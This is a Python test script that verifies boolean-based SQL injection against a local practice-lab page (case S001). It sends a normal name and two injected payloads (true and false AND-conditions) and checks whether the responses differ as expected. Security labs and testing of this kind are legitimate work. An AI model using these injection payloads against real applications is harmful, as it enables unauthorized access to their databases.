#!/usr/bin/env python3
import sys
import urllib.parse
import urllib.request

BASE = "http://127.0.0.1:4280/lab_cases/S001/index.php"
FAIL_MARK = "查询失败"


def fetch(name: str):
    query = urllib.parse.urlencode({"name": name})
    url = BASE + "?" + query
    req = urllib.request.Request(
        url,
        headers={"User-Agent": "S001-sqli-check/1.0"},
        method="GET",
    )
    with urllib.request.urlopen(req, timeout=5) as resp:
        body = resp.read().decode("utf-8", "replace")
        return resp.status, body


def has_alice(body: str) -> bool:
    return "ID 1" in body and "Alice" in body


def main() -> int:
    cases = [
        ("normal", "Alice", True),
        ("true_condition", "Alice' AND '1'='1", True),
        ("false_condition", "Alice' AND '1'='2", False),
    ]

    all_ok = True
    for label, payload, expect_alice in cases:
        try:
            status, body = fetch(payload)
        except Exception as exc:
            print(f"{label}: REQUEST_ERROR {exc!r}")
            all_ok = False
            continue

        got_alice = has_alice(body)
        got_fail = FAIL_MARK in body
        print(
            f"{label}: status={status}, has_alice={got_alice}, "
            f"expect_alice={expect_alice}, query_failed={got_fail}"
        )

        if got_fail:
            all_ok = False
        if got_alice != expect_alice:
            all_ok = False

    if all_ok:
        print("RESULT: boolean SQL injection behavior matched expectations; HTTP 200 alone was not used.")
        return 0

    print("RESULT: expectations not met; check endpoint path, db_connect.php, lab_people data, and error logs.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
